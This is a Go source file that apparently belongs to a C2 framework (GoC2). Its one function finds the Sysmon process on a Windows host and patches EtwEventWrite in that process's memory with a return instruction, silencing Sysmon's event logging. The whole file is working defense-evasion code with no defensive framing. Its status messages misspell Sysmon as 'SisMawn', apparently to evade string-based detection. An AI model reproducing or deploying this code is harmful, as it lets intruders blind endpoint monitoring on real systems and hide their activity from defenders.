//go:build windows
// +build windows

package patchsysmon

import (
	"fmt"
	"strings"
	"syscall"
	"unsafe"

	"github.com/latortuga71/GoC2/pkg/winapi"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

func DisableSysmon() (string, error) {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational`, registry.ALL_ACCESS)
	if err != nil {
		return "", err
	}
	defer key.Close()
	sysmonPublisher, _, err := key.GetStringValue("OwningPublisher")
	if err != nil {
		return "", err
	}
	sysmonKeyPath := fmt.Sprintf("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Publishers\\%s", sysmonPublisher)
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, sysmonKeyPath, registry.ALL_ACCESS)
	if err != nil {
		return "", err
	}
	defer k.Close()
	exePath, _, err := k.GetStringValue("ResourceFileName")
	if err != nil {
		return "", err
	}
	pathSplit := strings.Split(exePath, "\\")
	path := pathSplit[len(pathSplit)-1] // last item
	// Find SYSMON PID
	var sysmonPid uint32 = 0
	hSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return "", err
	}
	var pe32 windows.ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))
	// do
	err = windows.Process32First(hSnapshot, &pe32)
	if err != nil {
		return "", err
	}
	// while
	for {
		err = windows.Process32Next(hSnapshot, &pe32)
		if err != nil {
			break
		}
		// else do stuff with process
		name := syscall.UTF16ToString(pe32.ExeFile[:])
		if name == path {
			sysmonPid = pe32.ProcessID
			break
		}
	}
	if sysmonPid == 0 {
		windows.CloseHandle(hSnapshot)
		return "SisMawn Process Not Found.", nil
	}
	// Get HANDLE
	hSysmonProcess, err := windows.OpenProcess(0x001F0FFF, false, sysmonPid)
	if err != nil {
		return "", err
	}
	addrNtdll, err := windows.LoadLibrary("ntdll.dll")
	if err != nil {
		return "", err
	}
	addrEtwEventWrite, err := windows.GetProcAddress(addrNtdll, "EtwEventWrite")
	if err != nil {
		return "", err
	}
	var flProtect uint32 = windows.PAGE_EXECUTE_READWRITE
	var newFlProtect uint32 = windows.PAGE_EXECUTE_READWRITE
	var patch [2]byte
	patch[0] = 0xC3
	patch[1] = 0x00
	res, err := winapi.VirtualProtectEx(
		syscall.Handle(hSysmonProcess),
		addrEtwEventWrite,
		2,
		newFlProtect,
		&flProtect)
	if !res {
		return "", err
	}
	var nBytesWritten *uint32
	writeMem, err := winapi.WriteProcessMemory(
		syscall.Handle(hSysmonProcess),
		addrEtwEventWrite,
		(uintptr)(unsafe.Pointer(&patch[0])),
		2,
		nBytesWritten)
	if !writeMem {
		return "", err
	}
	res, err = winapi.VirtualProtectEx(
		syscall.Handle(hSysmonProcess),
		addrEtwEventWrite,
		2,
		flProtect,
		&flProtect)
	if !res {
		return "", err
	}
	return "Disabled SisMawn.", nil
}
